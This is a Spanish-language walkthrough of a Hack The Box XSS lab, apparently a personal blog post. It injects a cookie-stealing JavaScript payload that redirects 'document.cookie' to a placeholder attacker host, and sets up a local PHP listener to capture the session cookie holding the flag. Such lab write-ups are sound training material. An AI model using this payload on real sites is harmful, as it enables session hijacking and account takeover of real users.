--- 
title: "Laboratorio de XSS"  
date: 2025-08-30
tags: [hackthebox, XSS, web]
categories: ["XSS", "Hack The Box"]
summary: "Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un **payload de JavaScript** para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag."
draft: false 

---
![](../../../../../images/Miniaturas/sqlmap.pn)
#### Enunciado
Estamos realizando una prueba de penetración de aplicaciones web para una empresa que lo contrató y que acaba de lanzar su nuevo [ `Security Blog`nombre del sitio]. En nuestro plan de pruebas de penetración de aplicaciones web, llegamos a la parte donde debe probar la aplicación web contra vulnerabilidades de secuencias de comandos entre sitios (XSS).

Inicie el servidor a continuación, asegúrese de estar conectado a la VPN y acceda al `/assessment`directorio en el servidor usando el navegador.

Aplica las habilidades que aprendiste en este módulo para lograr lo siguiente:
1. Identificar un campo de entrada de usuario que sea vulnerable a una vulnerabilidad XSS
2. Encuentre una carga útil XSS que funcione y que ejecute código JavaScript en el navegador del destino
3. Usando las `Session Hijacking`técnicas, intenta robar las cookies de la víctima, que deben contener la bandera.


**¿Cuál es el valor de la cookie 'bandera'?**
Primero visitamos la ruta que nos dicen y de primeras vemos un blog wordpress.
![](../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-1.png)
Empezamos a buscar campos en los que tengamos capacidad de introducir datos para ver si vemos alguno vulnerable a `XSS`.
Vemos que tenemos acceso a otra página del blog
![](../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-2.png)
Al final de la misma página vemos que tenemos un formulatio para postear contenido en el blog. 
Con varios campos.
![](../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-3.png)
En ellos vamos a probar con lo que nos habían comentado en el enunciado de la `Session Hijacking`.
Vamos a ponernos en escucha en nuestra máquina local 
```bash
php -S 0.0.0.0:80
```

Insertamos el payload en cada campo exepto el email. 

```javascript
document.location='http://OUR_IP?c='+document.cookie;
```

![](../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-4.png)

Mientras vemos que cuando hacemos la petición capturamos la cookie de sesión con la flag.

![](../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-5.png)


Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.